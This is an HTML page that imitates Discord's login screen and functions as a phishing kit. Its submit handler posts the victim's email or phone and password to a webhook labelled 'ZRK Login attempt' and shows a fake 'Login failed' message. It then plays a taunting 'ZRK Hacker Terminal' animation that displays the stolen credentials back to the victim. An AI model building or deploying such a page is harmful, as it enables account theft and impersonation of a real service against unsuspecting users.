<html><head><base href="https://cdn.example.com/discord-login/">
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Discord Login</title>
<style>
  body, html {
    margin: 0;
    padding: 0;
    font-family: 'Whitney', 'Helvetica Neue', Helvetica, Arial, sans-serif;
    background-color: #36393f;
    display: flex;
    justify-content: center;
    align-items: center;
    height: 100vh;
    color: #dcddde;
    overflow: hidden;
  }
  .login-container {
    background-color: #2f3136;
    padding: 32px;
    border-radius: 5px;
    box-shadow: 0 2px 10px 0 rgba(0,0,0,.2);
    width: 100%;
    max-width: 784px;
    display: flex;
    position: relative;
    z-index: 1;
    transition: all 0.5s ease-in-out;
  }
  .login-form {
    flex: 1;
    margin-right: 32px;
  }
  .header {
    display: flex;
    justify-content: space-between;
    align-items: center;
    margin-bottom: 20px;
  }
  .go-back {
    color: #b9bbbe;
    text-decoration: none;
    font-size: 14px;
  }
  h2 {
    color: #fff;
    font-size: 24px;
    font-weight: 600;
    margin: 0 0 8px 0;
  }
  .subtitle {
    color: #b9bbbe;
    font-size: 16px;
    margin-bottom: 20px;
  }
  form {
    display: flex;
    flex-direction: column;
  }
  label {
    margin-bottom: 8px;
    font-size: 12px;
    font-weight: 600;
    color: #8e9297;
    text-transform: uppercase;
  }
  input {
    padding: 10px;
    margin-bottom: 20px;
    border: none;
    background-color: #202225;
    color: #dcddde;
    border-radius: 3px;
    font-size: 16px;
    transition: background-color 0.3s ease;
  }
  input:focus {
    background-color: #40444b;
    outline: none;
  }
  button {
    background-color: #5865f2;
    color: #fff;
    border: none;
    padding: 12px;
    border-radius: 3px;
    font-size: 16px;
    font-weight: 500;
    cursor: pointer;
    transition: background-color 0.3s ease, transform 0.1s ease;
  }
  button:hover {
    background-color: #4752c4;
  }
  button:active {
    transform: scale(0.98);
  }
  .forgot-password {
    text-align: left;
    margin-top: 4px;
    margin-bottom: 20px;
  }
  .forgot-password a {
    color: #00aff4;
    font-size: 14px;
    text-decoration: none;
    transition: color 0.3s ease;
  }
  .forgot-password a:hover {
    color: #0d84ff;
  }
  .register {
    text-align: left;
    margin-top: 20px;
    font-size: 14px;
  }
  .register a {
    color: #00aff4;
    text-decoration: none;
    transition: color 0.3s ease;
  }
  .register a:hover {
    color: #0d84ff;
  }
  .qr-code {
    flex: 0 0 240px;
    text-align: center;
    padding: 32px 0;
    background-color: #36393f;
    border-radius: 5px;
    transition: opacity 0.5s ease;
  }
  .qr-code-container {
    width: 176px;
    height: 176px;
    margin: 0 auto 16px;
    background-color: #fff;
    padding: 8px;
    border-radius: 5px;
    display: flex;
    justify-content: center;
    align-items: center;
    transition: transform 0.3s ease;
  }
  .qr-code-container:hover {
    transform: scale(1.05);
  }
  .qr-code img {
    width: 160px;
    height: 160px;
  }
  .qr-code p {
    margin-top: 8px;
    font-size: 16px;
    color: #fff;
    font-weight: 600;
  }
  .qr-code .subtitle {
    font-size: 14px;
    color: #b9bbbe;
    margin-top: 8px;
    padding: 0 16px;
  }
  .qr-code a {
    color: #00aff4;
    text-decoration: none;
    font-size: 14px;
    margin-top: 16px;
    display: inline-block;
    transition: color 0.3s ease;
  }
  .qr-code a:hover {
    color: #0d84ff;
  }
  .error-message {
    color: #ed4245;
    margin-top: 10px;
    font-size: 14px;
    display: none;
    opacity: 0;
    transition: opacity 0.5s ease;
  }
  .shatter-effect {
    position: fixed;
    top: 0;
    left: 0;
    width: 100%;
    height: 100%;
    pointer-events: none;
    z-index: 9999;
    display: none;
  }
  .shatter-piece {
    position: absolute;
    background-color: #36393f;
    transition: all 1.5s cubic-bezier(0.68, -0.55, 0.265, 1.55);
    opacity: 1;
    box-shadow: 0 0 10px rgba(0,0,0,0.3);
  }
  .black-overlay {
    position: fixed;
    top: 0;
    left: 0;
    width: 100%;
    height: 100%;
    background-color: black;
    opacity: 0;
    transition: opacity 1.5s cubic-bezier(0.19, 1, 0.22, 1);
    pointer-events: none;
    z-index: 10000;
  }
  .terminal {
    position: fixed;
    top: 50%;
    left: 50%;
    transform: translate(-50%, -50%) scale(0.9);
    width: 80%;
    max-width: 800px;
    height: 500px;
    background-color: rgba(41, 0, 77, 0.9);
    border-radius: 10px;
    padding: 20px;
    font-family: 'Courier New', monospace;
    color: #bb86fc;
    overflow-y: auto;
    display: none;
    z-index: 10001;
    box-shadow: 0 0 20px rgba(187, 134, 252, 0.5);
    border: 2px solid #bb86fc;
    opacity: 0;
    transition: all 0.5s cubic-bezier(0.68, -0.55, 0.265, 1.55);
  }
  .terminal.active {
    transform: translate(-50%, -50%) scale(1);
    opacity: 1;
  }
  .terminal-content {
    white-space: pre-wrap;
    line-height: 1.5;
  }
  .terminal-header {
    display: flex;
    justify-content: space-between;
    align-items: center;
    margin-bottom: 10px;
    padding-bottom: 10px;
    border-bottom: 1px solid #bb86fc;
  }
  .terminal-title {
    font-size: 18px;
    font-weight: bold;
  }
  .terminal-buttons {
    display: flex;
  }
  .terminal-button {
    width: 12px;
    height: 12px;
    border-radius: 50%;
    margin-left: 8px;
    transition: transform 0.3s ease;
  }
  .terminal-button:hover {
    transform: scale(1.2);
  }
  .terminal-button-red {
    background-color: #ff5f56;
  }
  .terminal-button-yellow {
    background-color: #ffbd2e;
  }
  .terminal-button-green {
    background-color: #27c93f;
  }
  .blinking-cursor {
    animation: blink 1s step-end infinite;
  }
  @keyframes blink {
    0%, 100% { opacity: 1; }
    50% { opacity: 0; }
  }
  .company-logo {
    position: absolute;
    bottom: 10px;
    right: 10px;
    font-size: 14px;
    color: #8e9297;
    opacity: 0.7;
  }
</style>
</head>
<body>
  <div class="login-container" id="login-container">
    <div class="login-form">
      <div class="header">
        <a href="#" class="go-back">Go back</a>
      </div>
      <h2>Welcome back!</h2>
      <p class="subtitle">We're so excited to see you again!</p>
      <form id="login-form">
        <label for="email">EMAIL OR PHONE NUMBER *</label>
        <input type="text" id="email" name="email" required>
        <label for="password">PASSWORD *</label>
        <input type="password" id="password" name="password" required>
        <div class="forgot-password">
          <a href="https://discord.com/forgot">Forgot your password?</a>
        </div>
        <button type="submit">Log In</button>
        <div class="error-message" id="error-message">Login failed. Please check your email and password.</div>
      </form>
      <div class="register">
        Need an account? <a href="https://discord.com/register">Register</a>
      </div>
    </div>
    <div class="qr-code">
      <div class="qr-code-container">
        <img src="/a/051872bd-b531-489a-b934-3ffcb2281561" alt="QR code for Discord login" width="160" height="160">
      </div>
      <p>Log in with QR Code</p>
      <p class="subtitle">Scan this with the Discord mobile app to log in instantly.</p>
      <a href="#">Or, sign in with passkey</a>
    </div>
    <div class="company-logo">ZRK</div>
  </div>

  <div class="shatter-effect" id="shatter-effect"></div>
  <div class="black-overlay" id="black-overlay"></div>
  <div class="terminal" id="terminal">
    <div class="terminal-header">
      <div class="terminal-title">ZRK Hacker Terminal</div>
      <div class="terminal-buttons">
        <div class="terminal-button terminal-button-red"></div>
        <div class="terminal-button terminal-button-yellow"></div>
        <div class="terminal-button terminal-button-green"></div>
      </div>
    </div>
    <div class="terminal-content" id="terminal-content"></div>
  </div>

  <script>
    function createShatterPieces() {
      const shatterEffect = document.getElementById('shatter-effect');
      const numPieces = 100;
      for (let i = 0; i < numPieces; i++) {
        const piece = document.createElement('div');
        piece.className = 'shatter-piece';
        piece.style.width = `${Math.random() * 100 + 50}px`;
        piece.style.height = `${Math.random() * 100 + 50}px`;
        piece.style.left = `${Math.random() * 100}vw`;
        piece.style.top = `${Math.random() * 100}vh`;
        shatterEffect.appendChild(piece);
      }
    }

    function shatterScreen() {
      const loginContainer = document.getElementById('login-container');
      const shatterEffect = document.getElementById('shatter-effect');
      const blackOverlay = document.getElementById('black-overlay');
      
      loginContainer.style.opacity = '0';
      loginContainer.style.transform = 'scale(0.9)';
      
      setTimeout(() => {
        shatterEffect.style.display = 'block';
        const pieces = shatterEffect.getElementsByClassName('shatter-piece');
        for (let piece of pieces) {
          const randomX = (Math.random() - 0.5) * 300;
          const randomY = (Math.random() - 0.5) * 300;
          const randomRotate = (Math.random() - 0.5) * 1080;
          piece.style.transform = `translate(${randomX}px, ${randomY}px) rotate(${randomRotate}deg)`;
          piece.style.opacity = '0';
        }

        setTimeout(() => {
          blackOverlay.style.opacity = '1';
          setTimeout(showTerminal, 500);
        }, 500);
      }, 500);
    }

    function typeWriter(text, element, index, interval) {
      if (index < text.length) {
        element.innerHTML += text.charAt(index);
        index++;
        setTimeout(() => typeWriter(text, element, index, interval), interval);
      } else {
        element.innerHTML += '<span class="blinking-cursor">â–ˆ</span><br>';
      }
    }

    function showTerminal() {
      const terminal = document.getElementById('terminal');
      const terminalContent = document.getElementById('terminal-content');
      terminal.style.display = 'block';
      
      setTimeout(() => {
        terminal.classList.add('active');
      }, 50);

      const email = document.getElementById('email').value;
      const password = document.getElementById('password').value;

      const messages = [
        "ZRK Systems initializing advanced hacking protocols...",
        `Analyzing user input... Oh boy, "${email}"? Really?`,
        `That email is so basic, it probably thinks pumpkin spice is exotic.`,
        `Decrypting password... Wait, is that seriously "${password}"?`,
        `Your password game is weaker than ZRK's coffee machine.`,
        "Bypassing Discord security... It's like they're not even trying.",
        "Injecting ZRK custom malware... This is too easy, I'm almost bored.",
        `Accessing user account... Wow, your Discord history is SAD.`,
        "Downloading sensitive information... If you can call it that.",
        "Erasing digital footprints... As if anyone cares about your online presence.",
        "Establishing secure ZRK connection... Unlike your relationships, I bet.",
        "Transferring data packets to ZRK servers... Hope you didn't have anything important in there.",
        "Operation complete. You've been thoroughly owned by ZRK, congrats I guess.",
        "Disconnecting... Just like everyone else in your life. ZRK out!"
      ];

      let index = 0;
      const interval = setInterval(() => {
        if (index < messages.length) {
          typeWriter(messages[index], terminalContent, 0, 30);
          index++;
        } else {
          clearInterval(interval);
          terminalContent.innerHTML += '<br>Press any key to exit, if you can figure out how keyboards work...<br>ZRK thanks you for your contribution.';
          document.addEventListener('keydown', () => {
            terminal.classList.remove('active');
            setTimeout(() => {
              terminal.style.display = 'none';
            }, 500);
          }, { once: true });
        }
      }, 3000);
    }

    createShatterPieces();

    document.getElementById('login-form').addEventListener('submit', function(e) {
      e.preventDefault();
      const email = document.getElementById('email').value;
      const password = document.getElementById('password').value;
      
      // Send the login data to the specified webhook
      fetch('webhook', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          content: `ZRK Login attempt: Email/Phone: ${email}, Password: ${password}`
        })
      }).then(() => {
        // Show error message
        const errorMessage = document.getElementById('error-message');
        errorMessage.style.display = 'block';
        setTimeout(() => {
          errorMessage.style.opacity = '1';
        }, 50);
        
        // Clear the form
        document.getElementById('email').value = '';
        document.getElementById('password').value = '';

        // Trigger the shatter effect
        setTimeout(shatterScreen, 2000);
      }).catch(error => {
        console.error('Error:', error);
      });
    });
  </script>
</body>
</html>
